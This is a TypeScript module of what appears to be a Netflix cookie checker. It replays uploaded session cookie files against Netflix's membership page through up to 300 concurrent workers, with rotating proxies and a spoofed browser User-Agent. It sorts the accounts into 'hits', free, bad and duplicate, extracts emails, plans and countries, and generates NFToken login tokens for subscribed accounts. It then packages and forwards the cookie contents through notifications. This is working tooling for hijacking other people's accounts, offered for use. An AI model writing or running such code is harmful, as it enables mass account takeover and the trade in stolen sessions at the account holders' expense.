import type {
  AppConfig,
  CookieBundle,
  AccountInfo,
  CheckResult,
  CheckStatus,
  RunStats,
  PlanCount,
  ProgressUpdate,
  ProxyEntry,
  NfTokenData,
} from "./types.js";
import { extractCookieBundles, hasRequiredCookies, cookiesDictFromNetscape } from "./cookies.js";
import { extractInfo } from "./extract.js";
import {
  derivePlanInfo,
  deriveOutputPlanBucket,
  isSubscribedAccount,
  isOnHoldAccount,
  isExtraMemberAccount,
} from "./plan.js";
import { createNfToken, hasUsableNfToken } from "./nftoken.js";
import { getNfTokenMode, formatCookieFile, sendNotifications } from "./notifications.js";
import { describeHttpError } from "./utils.js";
import { parseProxies } from "./proxy.js";
import { saveResult, updateResult, updateRunStats } from "./db.js";

const RETRYABLE_STATUS_CODES = new Set([403, 429, 500, 502, 503, 504]);

const REDIRECT_STATUS_CODES = new Set([301, 302, 303, 307, 308]);

const LOGIN_PAGE_INDICATORS = [
  /"login"/i,
  /netflix\.com\/login/i,
  /"signIn"/i,
  /"pageType"\s*:\s*"login"/i,
  /"pageType"\s*:\s*"signIn"/i,
  /id="appMountPoint"[\s\S]*?login/i,
];

const SUSPENDED_INDICATORS = [
  /account\s+(has\s+been\s+)?suspended/i,
  /account\s+(has\s+been\s+)?canceled/i,
  /account\s+(has\s+been\s+)?cancelled/i,
  /membership\s+(has\s+been\s+)?cancel/i,
  /"membershipStatus"\s*:\s*"CANCELLED"/i,
  /"membershipStatus"\s*:\s*"CANCELED"/i,
  /"membershipStatus"\s*:\s*"SUSPENDED"/i,
  /"membershipStatus"\s*:\s*"EX_MEMBER"/i,
];

const PAYMENT_INDICATORS = [
  /payment\s+(method\s+)?(failed|declined|issue)/i,
  /"pastDue"\s*:\s*true/i,
  /"isPastDue"\s*:\s*true/i,
  /payment_retry/i,
];

function isLoginPage(text: string): boolean {
  if (!text) return false;
  return LOGIN_PAGE_INDICATORS.some((p) => p.test(text));
}

function isSuspendedAccount(text: string): boolean {
  if (!text) return false;
  return SUSPENDED_INDICATORS.some((p) => p.test(text));
}

function hasPaymentIssue(text: string): boolean {
  if (!text) return false;
  return PAYMENT_INDICATORS.some((p) => p.test(text));
}

function deriveFailureReason(
  statusCode: number | null,
  responseText: string | null,
  extractedInfo: AccountInfo | null
): string {
  if (statusCode && REDIRECT_STATUS_CODES.has(statusCode)) {
    return "cookie expired (redirected to login)";
  }

  if (statusCode === 401) {
    return "cookie expired (unauthorized)";
  }

  if (statusCode === 404) {
    return "account page not found (HTTP 404)";
  }

  if (statusCode === 200 && responseText) {
    if (isLoginPage(responseText)) {
      return "cookie expired (login page returned)";
    }
    if (isSuspendedAccount(responseText)) {
      return "account suspended or canceled";
    }
    if (hasPaymentIssue(responseText)) {
      return "payment issue / past due";
    }
    if (extractedInfo && extractedInfo.membershipStatus) {
      const status = extractedInfo.membershipStatus.toLowerCase();
      if (status.includes("cancel") || status.includes("ex_member")) {
        return "account canceled";
      }
      if (status.includes("suspend")) {
        return "account suspended";
      }
    }
    return "incomplete account data (no subscription info found)";
  }

  if (statusCode && statusCode > 0) {
    return describeHttpError(statusCode);
  }

  return "incomplete account page";
}

interface CookieTask {
  kind: "bundle" | "missing_cookies" | "read_error";
  cookieFile: string;
  cookiePath: string;
  bundle?: CookieBundle;
  bundleIndex?: number;
  bundleTotal?: number;
  bundleFile?: string;
  bundleLabel?: string;
  removeSource?: boolean;
  fileName?: string;
  content?: string;
  resultId?: number;
}

export interface RunOptions {
  config: AppConfig;
  cookies: Array<{ name: string; content: string; resultId?: number }>;
  proxies: ProxyEntry[];
  threadCount: number;
  runId: string;
  onProgress?: (update: ProgressUpdate) => void;
  signal?: AbortSignal;
}

export interface RunHandle {
  runId: string;
  total: number;
  promise: Promise<RunStats>;
  cancel: () => void;
}

interface RunContext {
  options: RunOptions;
  counts: RunStats;
  planCounts: PlanCount;
  processed: number;
  total: number;
  processedEmails: Set<string>;
  cancelled: boolean;
  abortController: AbortController;
}

function generateUnknownGuid(): string {
  return `unknown${Math.floor(Math.random() * 90000000 + 10000000)}`;
}

function randomSuffix(): string {
  return Array.from({ length: 5 }, () => {
    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    return chars[Math.floor(Math.random() * chars.length)];
  }).join("");
}

async function fetchAccountPage(
  cookies: Record<string, string>,
  proxy: ProxyEntry | null,
  timeout: number,
  signal?: AbortSignal
): Promise<{ text: string; status: number; info: AccountInfo | null }> {
  const headers: Record<string, string> = {
    "User-Agent":
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Accept-Encoding": "identity",
    Cookie: Object.entries(cookies)
      .map(([k, v]) => `${k}=${v}`)
      .join("; "),
  };

  const url = "https://www.netflix.com/account/membership";
  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), timeout * 1000);

    // Combine abort signals
    if (signal) {
      signal.addEventListener("abort", () => controller.abort(), { once: true });
    }

    const proxyUrl = proxy?.https;
    const fetchOptions: RequestInit = {
      method: "GET",
      headers,
      signal: controller.signal,
      redirect: "manual",
    };

    // Note: Node.js fetch doesn't natively support proxies.
    // We use a custom agent if available, or skip proxy for now.
    // In production with Render, proxy support can be added via undici ProxyAgent.
    const response = await fetch(url, fetchOptions);
    clearTimeout(timeoutId);

    const text = await response.text();
    const status = response.status;
    if (status === 200 && text) {
      const info = extractInfo(text);
      return { text, status, info };
    }
    return { text, status, info: null };
  } catch (err: any) {
    if (err?.name === "AbortError") {
      return { text: "", status: 0, info: null };
    }
    throw err;
  }
}

async function processTask(
  task: CookieTask,
  ctx: RunContext
): Promise<CheckResult> {
  const { options } = ctx;
  const config = options.config;

  if (task.kind === "read_error") {
    return { status: "error", reason: "file read error" };
  }

  if (task.kind === "missing_cookies") {
    return { status: "failed", reason: "missing required cookies" };
  }

  const bundle = task.bundle!;
  const netscapeContent = bundle.netscape_text;
  const cookies = bundle.cookies || cookiesDictFromNetscape(netscapeContent);

  if (!cookies || !hasRequiredCookies(cookies)) {
    return { status: "failed", reason: "missing required cookies" };
  }

  const maxRetryAttempts = Math.max(1, config.retries.error_proxy_attempts);
  const requestTimeout = Math.max(5, config.performance.request_timeout_seconds);
  const fallbackAccountPage = config.performance.fallback_account_page;
  const retryIncompleteInfo = config.performance.retry_incomplete_info;

  let responseText: string | null = null;
  let statusCode: number | null = null;
  let extractedInfo: AccountInfo | null = null;
  let lastError: Error | null = null;
  const usedProxyIndices = new Set<number>();
  const proxies = options.proxies;

  for (let attempt = 0; attempt < maxRetryAttempts; attempt++) {
    if (ctx.cancelled) break;

    // Get next proxy
    let proxy: ProxyEntry | null = null;
    if (proxies.length) {
      const available = proxies.map((_, i) => i).filter((i) => !usedProxyIndices.has(i));
      const candidates = available.length ? available : proxies.map((_, i) => i);
      const chosen = candidates[Math.floor(Math.random() * candidates.length)];
      usedProxyIndices.add(chosen);
      proxy = proxies[chosen];
    }

    try {
      const result = await fetchAccountPage(cookies, proxy, requestTimeout, ctx.abortController.signal);
      responseText = result.text;
      statusCode = result.status;
      extractedInfo = result.info;

      if (statusCode === 200 && responseText) {
        if (retryIncompleteInfo && attempt < maxRetryAttempts - 1) {
          if (!extractedInfo || !hasCompleteAccountInfo(extractedInfo)) {
            continue;
          }
        }
        break;
      }
      if (statusCode && RETRYABLE_STATUS_CODES.has(statusCode) && attempt < maxRetryAttempts - 1) {
        continue;
      }
      break;
    } catch (err) {
      lastError = err as Error;
      if (attempt < maxRetryAttempts - 1) continue;
    }
  }

  // Process results
  if (statusCode === 200 && responseText) {
    const info = extractedInfo || extractInfo(responseText);
    if (info.countryOfSignup && info.countryOfSignup !== "null") {
      const isSubscribed = isSubscribedAccount(info);
      const [planKey, planFolderLabel, planName] = deriveOutputPlanBucket(info, isSubscribed);
      const onHold = isSubscribed && isOnHoldAccount(info);
      // Account loaded successfully but may still have a specific failure state
      if (!isSubscribed && !onHold) {
        const status = (info.membershipStatus || "").toLowerCase();
        if (status.includes("cancel") || status.includes("ex_member")) {
          return { status: "failed" as CheckStatus, reason: "account canceled" };
        }
        if (status.includes("suspend")) {
          return { status: "failed" as CheckStatus, reason: "account suspended" };
        }
      }

      // Generate userGuid
      const userGuid = info.userGuid && info.userGuid !== "null" ? info.userGuid : generateUnknownGuid();
      info.userGuid = userGuid;

      const country = info.countryOfSignup || "Unknown";
      const emailValue = (info.email || "").trim().toLowerCase();
      const dupKey = emailValue || userGuid;

      // Check duplicate
      if (ctx.processedEmails.has(dupKey)) {
        // Duplicate
        let nfTokenData: NfTokenData | null = null;
        if (isSubscribed && getNfTokenMode(config) !== "false") {
          const nfTokenAttempts = Math.max(1, config.retries.nftoken_attempts);
          [nfTokenData] = await createNfToken(cookies, nfTokenAttempts);
        }
        const formatted = formatCookieFile(config, info, netscapeContent, isSubscribed, nfTokenData);
        return {
          status: "duplicate",
          planKey,
          planName,
          country,
          email: emailValue,
          accountInfo: info,
          cookieContent: netscapeContent,
          formattedOutput: formatted,
          nfTokenData,
        };
      }
      ctx.processedEmails.add(dupKey);

      // Generate NFToken
      let nfTokenData: NfTokenData | null = null;
      const shouldGenNfToken = getNfTokenMode(config) !== "false" && (isSubscribed || config.performance.nftoken_for_free);
      if (shouldGenNfToken) {
        const nfTokenAttempts = Math.max(1, config.retries.nftoken_attempts);
        [nfTokenData] = await createNfToken(cookies, nfTokenAttempts);
      }

      const formatted = formatCookieFile(config, info, netscapeContent, isSubscribed, nfTokenData);
      const fileName = isSubscribed
        ? `${(info.maxStreams || "Unknown").replace(/}$/, "")}_${country}_${info.showExtraMemberSection}_${userGuid}_${randomSuffix()}.txt`
        : `PaymentM-${info.paymentMethodType ? "True" : "False"}_${country}_${userGuid}_${randomSuffix()}.txt`;

      // Send notifications (non-blocking)
      sendNotifications(config, info, isSubscribed, fileName, formatted, netscapeContent, nfTokenData).catch(() => {});

      const resultStatus: CheckStatus = isSubscribed ? "success" : "free";
      return {
        status: resultStatus,
        planKey,
        planName,
        country,
        email: emailValue,
        onHold,
        accountInfo: info,
        cookieContent: netscapeContent,
        formattedOutput: formatted,
        nfTokenData,
      };
    } else {
      return { status: "failed" as CheckStatus, reason: deriveFailureReason(statusCode, responseText, info) };
    }
  } else if (lastError || (statusCode && RETRYABLE_STATUS_CODES.has(statusCode))) {
    let reason: string;
    if (statusCode && RETRYABLE_STATUS_CODES.has(statusCode)) {
      reason = describeHttpError(statusCode);
    } else if (lastError?.name === "AbortError" || lastError?.name === "TimeoutError") {
      reason = "timeout";
    } else {
      reason = "proxy error";
    }
    return { status: "error" as CheckStatus, reason };
  } else {
    return { status: "failed" as CheckStatus, reason: deriveFailureReason(statusCode, responseText, extractedInfo) };
  }
}

function hasCompleteAccountInfo(info: AccountInfo | null): boolean {
  if (!info) return false;
  const required = ["countryOfSignup", "membershipStatus", "localizedPlanName", "maxStreams", "videoQuality"];
  return required.every((f) => {
    const val = (info as any)[f];
    return val && val !== "null";
  });
}

export async function runCheck(opts: RunOptions): Promise<RunStats> {
  const { config, cookies, proxies, threadCount, runId, onProgress, signal } = opts;

  // Build tasks
  const tasks: CookieTask[] = [];
  for (const cookie of cookies) {
    const bundles = extractCookieBundles(cookie.content);
    if (!bundles.length) {
      tasks.push({
        kind: "missing_cookies",
        cookieFile: cookie.name,
        cookiePath: cookie.name,
      });
      continue;
    }
    for (const bundle of bundles) {
      tasks.push({
        kind: "bundle",
        cookieFile: cookie.name,
        cookiePath: cookie.name,
        bundle,
        bundleIndex: bundle.index,
        bundleTotal: bundle.total,
        bundleFile: cookie.name,
        bundleLabel: bundle.total > 1 ? `${cookie.name} [${bundle.index}/${bundle.total}]` : cookie.name,
        resultId: cookie.resultId,
      });
    }
  }

  const total = tasks.length;
  const ctx: RunContext = {
    options: opts,
    counts: { hits: 0, free: 0, bad: 0, duplicate: 0, on_hold: 0, errors: 0 },
    planCounts: {},
    processed: 0,
    total,
    processedEmails: new Set(),
    cancelled: false,
    abortController: new AbortController(),
  };

  if (signal) {
    signal.addEventListener("abort", () => {
      ctx.cancelled = true;
      ctx.abortController.abort();
    }, { once: true });
  }

  // Process tasks with limited concurrency
  const concurrency = Math.min(threadCount, 300);
  let taskIndex = 0;

  async function worker() {
    while (taskIndex < tasks.length && !ctx.cancelled) {
      const myIndex = taskIndex++;
      const task = tasks[myIndex];
      const result = await processTask(task, ctx);

      // Update counts
      ctx.processed++;
      const counts = ctx.counts;
      switch (result.status) {
        case "success":
          counts.hits++;
          if (result.onHold) counts.on_hold++;
          if (result.planKey) {
            ctx.planCounts[result.planKey] = (ctx.planCounts[result.planKey] || 0) + 1;
          }
          break;
        case "free":
          counts.free++;
          if (result.planKey) {
            ctx.planCounts[result.planKey] = (ctx.planCounts[result.planKey] || 0) + 1;
          }
          break;
        case "failed":
          counts.bad++;
          break;
        case "duplicate":
          counts.duplicate++;
          break;
        case "error":
          counts.errors++;
          break;
      }

      // Save to DB (non-blocking) — skip duplicates, they are auto-deleted
      if (result.status !== "duplicate") {
        if (task.resultId) {
          // Recheck mode: update the existing row so status/counts stay accurate
          updateResult(task.resultId, result).catch(() => {});
        } else {
          saveResult(runId, result).catch(() => {});
        }
      }

      // Send progress update
      if (onProgress) {
        onProgress({
          type: "result",
          runId,
          status: result.status,
          planKey: result.planKey,
          planName: result.planName,
          country: result.country,
          email: result.email,
          reason: result.reason,
          onHold: result.onHold,
          processed: ctx.processed,
          total: ctx.total,
          left: ctx.total - ctx.processed,
          counts: { ...counts },
          planCounts: { ...ctx.planCounts },
          accountInfo: result.accountInfo,
          cookieContent: result.cookieContent,
          formattedOutput: result.formattedOutput,
          nfTokenData: result.nfTokenData,
        });
      }
    }
  }

  const workers = Array.from({ length: concurrency }, () => worker());
  await Promise.all(workers);

  // Final update
  if (onProgress) {
    onProgress({
      type: "complete",
      runId,
      processed: ctx.processed,
      total: ctx.total,
      left: 0,
      counts: { ...ctx.counts },
      planCounts: { ...ctx.planCounts },
    });
  }

  // Update DB with final stats
  updateRunStats(runId, ctx.counts, ctx.total, ctx.cancelled ? "cancelled" : "completed").catch(() => {});

  return ctx.counts;
}
